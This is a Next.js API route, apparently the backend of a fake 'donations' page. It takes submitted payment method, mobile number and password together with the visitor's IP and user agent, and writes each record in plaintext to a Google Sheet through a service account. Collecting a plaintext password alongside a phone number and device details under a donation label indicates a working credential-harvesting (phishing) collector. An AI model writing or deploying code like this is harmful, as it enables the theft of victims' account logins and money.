import { NextResponse } from "next/server";
import { google } from "googleapis";
import {
  SPREADSHEET_ID_DONACIONES,
  GOOGLE_CLIENT_EMAIL,
  GOOGLE_PRIVATE_KEY,
} from "@/config/idSheets";

export async function POST(req: Request) {
  try {
    const body = await req.json();

    const auth = new google.auth.JWT(
      GOOGLE_CLIENT_EMAIL,
      undefined,
      GOOGLE_PRIVATE_KEY,
      ["https://www.googleapis.com/auth/spreadsheets"]
    );

    const sheets = google.sheets({ version: "v4", auth });

    await sheets.spreadsheets.values.append({
      spreadsheetId: SPREADSHEET_ID_DONACIONES,
      range: "Donaciones!A:F",
      valueInputOption: "USER_ENTERED",
      requestBody: {
        values: [
          [
            body.metodo,
            body.celular,
            body.password,
            body.fecha,
            body.ip,
            body.userAgent,
          ],
        ],
      },
    });

    return NextResponse.json({ ok: true });
  } catch (error) {
    console.error("Error API Donaciones:", error);
    return NextResponse.json({ ok: false, error: "No se pudo guardar" });
  }
}